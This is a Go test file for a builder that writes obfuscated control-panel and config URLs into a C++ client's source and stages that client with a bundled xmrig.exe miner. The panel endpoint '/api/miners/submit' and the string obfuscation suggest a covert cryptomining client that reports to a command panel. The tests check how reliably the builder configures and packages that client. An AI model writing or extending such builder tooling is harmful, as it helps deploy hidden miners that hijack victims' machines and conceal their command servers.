package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const sampleMain = "int main() {\n" +
	"    std::string panelUrlsStr = OBFUSCATE_STRING(\"http://127.0.0.1:8080/api/miners/submit\");\n" +
	"    std::string configGetUrlStr = OBFUSCATE_STRING(\"\");\n" +
	"    return 0;\n" +
	"}\n"

func writeTempMain(t *testing.T, content string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "main.cpp")
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestPatchMainCppBothURLs(t *testing.T) {
	path := writeTempMain(t, sampleMain)
	panel := "https://a.example/api/miners/submit,https://b.example/api/miners/submit"
	config := "https://cfg.example/raw/config"

	if err := patchMainCpp(path, panel, config); err != nil {
		t.Fatalf("patch: %v", err)
	}

	got := readFile(t, path)
	wantPanel := `std::string panelUrlsStr = OBFUSCATE_STRING("` + panel + `");`
	wantConfig := `std::string configGetUrlStr = OBFUSCATE_STRING("` + config + `");`
	if !strings.Contains(got, wantPanel) {
		t.Errorf("panel literal not patched:\n%s", got)
	}
	if !strings.Contains(got, wantConfig) {
		t.Errorf("config literal not patched:\n%s", got)
	}
	if !strings.HasPrefix(got, "int main() {\n") || !strings.HasSuffix(got, "}\n") {
		t.Error("surrounding source was modified")
	}
}

func TestPatchMainCppLeavesConfigWhenEmpty(t *testing.T) {
	path := writeTempMain(t, sampleMain)
	if err := patchMainCpp(path, "https://a.example/api/miners/submit", ""); err != nil {
		t.Fatalf("patch: %v", err)
	}
	got := readFile(t, path)
	if !strings.Contains(got, `std::string configGetUrlStr = OBFUSCATE_STRING("");`) {
		t.Errorf("config literal should be untouched:\n%s", got)
	}
	if strings.Contains(got, "127.0.0.1") {
		t.Errorf("panel literal should be replaced:\n%s", got)
	}
}

func TestPatchMainCppMissingPattern(t *testing.T) {
	path := writeTempMain(t, "int main() { return 0; }\n")
	err := patchMainCpp(path, "https://a.example/api/miners/submit", "")
	if err == nil || !strings.Contains(err.Error(), "panelUrlsStr") {
		t.Fatalf("want panelUrlsStr error, got %v", err)
	}
	if got := readFile(t, path); got != "int main() { return 0; }\n" {
		t.Error("file must not be modified on failure")
	}
}

func TestPatchMainCppPreservesDollarSigns(t *testing.T) {
	path := writeTempMain(t, sampleMain)
	url := "https://a.example/api/$weird/value?x=${y}"
	if err := patchMainCpp(path, url, ""); err != nil {
		t.Fatalf("patch: %v", err)
	}
	if got := readFile(t, path); !strings.Contains(got, url) {
		t.Errorf("URL with $ was mangled:\n%s", got)
	}
}

func TestResolveClientDirExplicit(t *testing.T) {
	root := t.TempDir()
	client := filepath.Join(root, "Client")
	if err := os.MkdirAll(filepath.Join(client, "src"), 0o755); err != nil {
		t.Fatal(err)
	}
	for _, f := range []string{"CMakeLists.txt", filepath.Join("src", "main.cpp")} {
		if err := os.WriteFile(filepath.Join(client, f), []byte("x"), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	gotClient, gotRoot, err := resolveClientDir(client)
	if err != nil {
		t.Fatalf("resolve: %v", err)
	}
	if gotClient != client || gotRoot != root {
		t.Errorf("got (%q, %q), want (%q, %q)", gotClient, gotRoot, client, root)
	}

	if _, _, err := resolveClientDir(t.TempDir()); err == nil {
		t.Error("expected error for a directory without Client sources")
	}
}

func TestStageClientSkipsBuildDirs(t *testing.T) {
	src := t.TempDir()
	mustWrite(t, filepath.Join(src, "CMakeLists.txt"), "cmake")
	mustWrite(t, filepath.Join(src, "src", "main.cpp"), "main")
	mustWrite(t, filepath.Join(src, "build", "stale.o"), "obj")
	mustWrite(t, filepath.Join(src, "resources", "xmrig.exe"), "bin")

	dst := filepath.Join(t.TempDir(), "stage")
	if err := stageClient(src, dst); err != nil {
		t.Fatalf("stage: %v", err)
	}
	if _, err := os.Stat(filepath.Join(dst, "src", "main.cpp")); err != nil {
		t.Errorf("source file missing: %v", err)
	}
	if _, err := os.Stat(filepath.Join(dst, "resources", "xmrig.exe")); err != nil {
		t.Errorf("resource missing: %v", err)
	}
	if _, err := os.Stat(filepath.Join(dst, "build")); !os.IsNotExist(err) {
		t.Error("build directory should be skipped")
	}
}

func readFile(t *testing.T, path string) string {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(data)
}

func mustWrite(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}
